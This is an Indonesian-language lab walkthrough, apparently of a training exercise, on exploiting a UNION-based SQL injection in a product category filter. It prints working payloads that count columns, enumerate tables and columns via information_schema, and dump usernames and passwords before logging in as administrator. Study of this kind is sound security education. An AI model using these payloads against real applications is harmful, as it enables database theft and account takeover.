# SQL injection attack, listing the database contents on non-Oracle databases

<img width="1208" height="804" alt="image" src="https://github.com/user-attachments/assets/b14f26d9-74f7-4dab-8596-74fff355dd1e" />

Aplikasi ini memiliki kerentanan SQL Injection kritis berbasis UNION pada filter kategori produk. Kerentanan ini memungkinkan penyerang untuk tidak hanya memanipulasi query tetapi juga untuk mengekstrak data sensitif dari seluruh database dengan memanfaatkan skema information_schema.
- Tujuan: Mendapatkan username dan password semua pengguna, menemukan kredensial administrator, dan menggunakannya untuk login.
- Konteks: SQL injection berbasis UNION pada filter kategori produk.
- Database: Non-Oracle (misalnya, PostgreSQL, MySQL, MSSQL), yang berarti kita dapat menggunakan skema standar information_schema untuk mendapatkan metadata database.
- Alur Serangan:
  - Reconnaissance: Cari tahu jumlah kolom dan tipe datanya.
  - Enumerasi Tabel: Dapatkan daftar semua tabel dalam database untuk menemukan tabel yang berisi data pengguna.
  - Enumerasi Kolom: Setelah menemukan tabel pengguna, dapatkan daftar semua kolom di tabel tersebut untuk menemukan kolom username dan password.
  - Ekstraksi Data: Ambil semua data dari kolom username dan password.
  - Penyelesaian: Temukan password administrator dan login.

## Langkah langkah Pengerjaan

Langkah 1 & 2: Menentukan Jumlah dan Tipe Data Kolom

- Buka lab dan klik salah satu kategori produk.
- Selanjutnya akan menyuntikkan payload ORDER BY pada parameter category. 
- Menentukan Jumlah Kolom: Gunakan payload ' ORDER BY n-- sampai menemukan error.
  - ' ORDER BY 1-- -> Berhasil.
  - url :
    ```
    .../filter?category=' ORDER BY 1--
    ```

<img width="1768" height="802" alt="image" src="https://github.com/user-attachments/assets/92e6c882-069f-4f05-b2d1-e1add49d1c6a" />


  - ' ORDER BY 2-- -> Berhasil.
  - url :
    ```
    .../filter?category=' ORDER BY 2--
    ```

<img width="1546" height="587" alt="image" src="https://github.com/user-attachments/assets/291c2860-c83f-417c-adaa-6b36a3ef82e3" />


  - ' ORDER BY 3-- -> Error.
  - url :
    ```
    .../filter?category=' ORDER BY 3--
    ```

<img width="1501" height="353" alt="image" src="https://github.com/user-attachments/assets/fd163a8c-11a7-4690-82da-65e66f8f0f17" />

Kesimpulan: Query asli memiliki 2 kolom.

- Menentukan Tipe Data: Gunakan payload ' UNION SELECT 'a','b'--. Jika string 'a' dan 'b' muncul di halaman, berarti kedua kolom tersebut dapat menampung data teks.
- url : 
```
.../filter?category=' UNION SELECT 'a','b'--
```

<img width="1385" height="520" alt="image" src="https://github.com/user-attachments/assets/329f9194-e18b-4506-8633-3bd1cc1e568b" />

Langkah 3: Mendapatkan Daftar Semua Tabel
- Payload: ' UNION SELECT table_name, NULL FROM information_schema.tables--
- url :
  ```
  .../filter?category=' UNION SELECT table_name, NULL FROM information_schema.tables--
  ```
- Penjelasan:
  - table_name: Ini adalah nama kolom di dalam tabel information_schema.tables yang berisi nama-nama semua tabel.
  - NULL: Kita gunakan sebagai placeholder untuk kolom kedua.
  - Hasil: Halaman akan memuat ulang dan menampilkan daftar semua nama tabel yang ada di database. Cari nama yang terdengar seperti menyimpan data pengguna, misalnya users, accounts, atau sesuatu yang diacak seperti users_abcdef.

<img width="1482" height="881" alt="image" src="https://github.com/user-attachments/assets/b65f92c3-1f37-4e44-9d37-0f5a0d2e0d55" />

Langkah 4 & 5: Menemukan Nama Kolom Kredensial

Setelah mengetahui nama tabel (users_scpanc), sekarang perlu mencari tahu nama kolom di dalamnya.
- Payload: ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_scpanc'--
- url
  ```
  .../filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_scpanc'--
  ```
  
- Penjelasan:
  - column_name: Nama kolom di dalam information_schema.columns yang berisi nama-nama semua kolom.
  - WHERE table_name = 'users_scpanc': Kita memfilter hasilnya agar hanya menampilkan kolom dari tabel yang kita temukan tadi. P
Hasil: Halaman akan menampilkan daftar semua kolom di dalam tabel users_scpanc.

<img width="1387" height="678" alt="image" src="https://github.com/user-attachments/assets/cc350149-8aa8-4985-98aa-0b4f441ced21" />


Langkah 6 & 7: Mengekstrak Username dan Password

Ini adalah langkah terakhir. Kita sekarang memiliki semua informasi yang kita butuhkan:
- Nama Tabel: users_scpanc
- Nama Kolom Username: username_gnzgzh
- Nama Kolom Password: password_fwdjzp
- Payload: ' UNION SELECT username_gnzgzh, password_fwdjzp FROM users_scpanc--
- url :
  ```
  .../filter?category=' UNION SELECT username_gnzgzh, password_fwdjzp FROM users_scpanc--
  ```
- Hasil: Halaman akan menampilkan daftar semua username di satu sisi dan password yang sesuai di sisi lain.

<img width="1475" height="560" alt="image" src="https://github.com/user-attachments/assets/ff07a137-af70-43a1-a96d-d150f59cea25" />

Langkah 8: Login Sebagai Administrator
- Cari di daftar hasil untuk username administrator.
- Salin password yang sesuai.
- Pergi ke halaman login aplikasi.
- Masukkan administrator sebagai username dan password yang baru saja Anda temukan.
- Klik login, dan lab akan terselesaikan.

<img width="984" height="463" alt="image" src="https://github.com/user-attachments/assets/8b4e5b2e-aea0-4dc6-ae8d-e3a9db91013c" />

<img width="1626" height="321" alt="image" src="https://github.com/user-attachments/assets/467626d8-992c-48a2-b514-35b8dc9e0061" />

## Dampak

Dampak dari kerentanan ini adalah Kompromi Total Data (Total Data Compromise). Penyerang dapat membaca data sensitif dari tabel mana pun di dalam database, yang dalam kasus ini termasuk kredensial login untuk semua pengguna.
